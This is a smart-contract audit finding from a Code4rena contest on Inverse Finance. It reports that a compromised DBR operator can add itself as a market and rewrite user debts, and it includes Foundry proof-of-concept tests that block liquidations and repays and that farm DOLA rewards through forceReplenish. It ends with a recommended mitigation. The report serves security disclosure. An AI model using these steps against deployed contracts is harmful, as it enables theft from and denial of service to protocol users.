# Original link
https://github.com/code-423n4/2022-10-inverse-findings/issues/292
# Lines of code

https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/DBR.sol#L99


# Vulnerability details

## Impact

The ```DBR.sol::addMarket()``` function is very permissive. In case where the ```DBR.sol::operator``` has been compromised/hacked, the malicious operator can add himself (or add another malicious wallet) as a ```market``` with the ```DBR.sol::addMarket()``` function and the protocol could be compromised in different ways:

- The malicious market/operator can modify the user debts using ```DBR.sol::onBorrow()``` and ```DBR.sol::onRepay()``` function because [src/DBR.sol#L301](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/DBR.sol#L301) and [src/DBR.sol#L314](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/DBR.sol#L314) won't revert the transaction because is called from the malicious market/operator.
- The ```liquidations``` could be blocked. The malicious market/operator can set an user debt (DBR.sol:debts) to zero and the liquidation won't be successfull because it will revert by a "Arithmetic over/underflow".
- The ```repays``` could be blocked. The market/malicious operator can set an user debt (DBR.sol:debts) to zero and the repays function won't be successfull because it will revert by a "Arithmetic over/underflow".
- The ```borrow```could be blocked. The market/malicious operator can set and user debt (DBR.sol:debts) to max and the borrow function won't be successfull because it will revert by a "Arithmetic over/underflow".
- In the ```Market.sol::forceReplenish()``` function, the [dbr.defict()](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L560) call is now controlled by the malicious market/operator, so he can manipulate an user deficit in order to get Dola rewards. The malicious market/operator can collude with another user.

Even though the likelihood of the ```DBR.sol::operator``` wallet being hacked might be low, given that the impact is critical. I think this makes it at least a medium severity bug.

## Proof of Concept

I have made some tests in order to show you the problem:

### Blocking liquidations

The ```Market.sol::liquidate()``` function will be reverted because overflow/underflow problem in ```DBR.sol:onRepay()``` side.

```
// Market.t.sol
// forge test -m "test_ModifyDebtOfAnUserAsOperatorAndBlockLiquidations" -vvv

function test_ModifyDebtOfAnUserAsOperatorAndBlockLiquidations() public {
    //
    // 1. Create an user and create their debt
    // 2. Set the User in a liquiditable position
    // 3. As a operator assign myself as a Market and modify the users debt with onRepay.
    //    The user will be with DRB.debts = 0
    // 4. As a liquidator try to liquidate the user position. The transaction will revert
    //
    //
    // 1. Create an user and give eth and deposit to the escrow.
    //
    uint amountToDeposit = 1 ether / 4;
    gibWeth(user, amountToDeposit);
    vm.startPrank(user);
    deposit(amountToDeposit);
    // Ask for borrow.
    uint amountToBorrow = convertWethToDola(amountToDeposit) * market.collateralFactorBps() / 10_000;
    market.borrow(amountToBorrow);
    // Assert the user debt
    assertEq(dbr.debts(user), amountToBorrow);
    assertEq(DOLA.balanceOf(user), amountToBorrow);

    //
    // 2. Set the user in a liquiditable position
    //
    // Pass two days and set the user in a liquiditable position
    vm.warp(block.timestamp + 2 days);
    uint totalDebt = amountToBorrow + dbr.deficitOf(user);
    market.forceReplenish(user, dbr.deficitOf(user));
    vm.stopPrank();

    //
    // 3. As an operator assign myself as a "market" then modify the users debt
    //
    // // Assign myself as a "market"
    vm.startPrank(operator);
    dbr.addMarket(operator);
    // Remove the debt to the user
    dbr.onRepay(user, totalDebt);
    // Now check the debt balance of the user in DBR
    assertEq(dbr.debts(user), 0 ether);
    // Now check the debt balance of the user in Market.sol. It is unbalanced
    assertEq(market.debts(user), totalDebt);
    vm.stopPrank();

    //
    // 4. As a liquidator, try to liquidate the user.
    // It will revert because the DBR.debt user is 0 and this situation generates an over/underflow
    //
    vm.startPrank(user2);
    vm.expectRevert("Arithmetic over/underflow");
    market.liquidate(user, 1 wei);
}
```

### Blocking repays

The ```Market.sol::repay()``` function will be reverted because overflow/underflow problem in ```DBR.sol:onRepay()``` side.

```
// Market.t.sol
// forge test -m "test_ModifyDebtOfAnUserAsOperatorAndBlockRepays" -vvv

function test_ModifyDebtOfAnUserAsOperatorAndBlockRepays() public {
    //
    // 1. Create an user and create their debt
    // 2. As a operator assign myself as a Market and modify the users debt with onRepay.
    //    The user will be with DRB.debts = 0
    // 3. As the user. try to repay and the transaction will revert because a underflow error.
    //
    //
    // 1. Create an user and give eth and deposit to the escrow.
    //
    uint amountToDeposit = 1 ether / 4;
    gibWeth(user, amountToDeposit);
    vm.startPrank(user);
    deposit(amountToDeposit);
    // Ask for borrow.
    uint amountToBorrow = convertWethToDola(amountToDeposit) * market.collateralFactorBps() / 10_000;
    market.borrow(amountToBorrow);
    // Assert the user debt
    assertEq(dbr.debts(user), amountToBorrow);
    assertEq(DOLA.balanceOf(user), amountToBorrow);
    vm.stopPrank();

    //
    // 2. As an operator assign myself as a "market" then modify the users debt
    //
    // // Assign myself as a "market"
    vm.startPrank(operator);
    dbr.addMarket(operator);
    // Remove the debt to the user
    dbr.onRepay(user, amountToBorrow);
    // Now check the debt balance of the user in DBR
    assertEq(dbr.debts(user), 0 ether);
    // Now check the debt balance of the user in Market.sol. It is unbalanced
    assertEq(market.debts(user), amountToBorrow);
    vm.stopPrank();

    //
    // 3. As the user. try to repay an the transaction will revert
    // It will revert because the DBR.debt user is 0 and this situation generates an over/underflow
    //
    vm.startPrank(user);
    vm.expectRevert("Arithmetic over/underflow");
    market.repay(user, 1 wei);
}
```

### ForceReplenish can be manipulated

The [defict](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L560) call in ```Market.sol::forceReplenish()``` could be manipulated since the malicious operator controls the ```DBR:debts``` therefore controls users deficit.

It is possible to get Dola rewards.

```
// Market.t.sol
// forge test -m "test_ModifyDebtOfAnUserAsOperatorAndGetDolaRewards" -vvv

function test_ModifyDebtOfAnUserAsOperatorAndGetDolaRewards() public {
    //
    // 1. create a borrow from a colluded user and create their debt
    // 2. As a operator assign myself as a "market" with the "addMarket" function
    // 3. As a malicious operator increment/decrement the debt of the step 1 user calling the dbr.onBorrow()/dbr.onRepay() in order to manipulate the user's deficit and pass the forceReplenish validation.
    // 4. As a colluded user do a "replenish" and get Dola rewards with forceReplenish
    // 5. Repeat steps 3, 4 and get more rewards.
    //
    // 1. Create a borrow from a colluded user
    //
    uint amountToDeposit = 1 ether / 4;
    gibWeth(user, amountToDeposit);
    // Deposit 0.25 as our collateral
    vm.startPrank(user);
    deposit(amountToDeposit);
    // Ask for borrow.
    uint amountToBorrow = 10 ether;
    market.borrow(amountToBorrow);
    // Assert the user debt for 10 ether
    assertEq(dbr.debts(user), 10 ether);
    assertEq(DOLA.balanceOf(user), 10 ether);
    // Pass two days
    vm.warp(block.timestamp + 2 days);
    // As a user do a replenish for all the deficit token.
    market.forceReplenish(user, dbr.deficitOf(user));
    // We receive a reward in Dola becuase we replenish our deficit
    assertEq(DOLA.balanceOf(user), 10002739726027397260 wei);
    // Our debt is 10.05
    assertEq(dbr.debts(user), 10054794520547945205 wei);
    vm.stopPrank();

    //
    // 2. As an operator assign myself as a "market"
    //
    // Assign myself as a "market"
    vm.startPrank(operator);
    dbr.addMarket(operator);
    //
    // 3. AS a malicious operator increment debt to the user
    //
    dbr.onBorrow(user, 10054794520547945205 wei);
    // Now check the debt balance of the user in DBR
    assertEq(dbr.debts(user), 20109589041095890410 wei);
    // Now check the debt balance of the user in Market.sol and is unbalanced
    assertEq(market.debts(user), 10054794520547945205 wei);
    vm.stopPrank();

    //
    // 4. As a colluded user, do a "replenish" and can get DOLA rewards
    //
    vm.warp(block.timestamp + 3 days);
    console.log(dbr.deficitOf(user));
    vm.startPrank(user);
    market.forceReplenish(user, dbr.deficitOf(user));
    assertEq(DOLA.balanceOf(user), 10011003940701820228 wei); // we receive a reward
}
```

## Tools used
Foundyr/VisualStudio

## Recommended Mitigation Steps

Consider manage the Markets differently. The DBR operator should be in charge only for DBR token administration not the markets. The protocol governance should manage the Markets.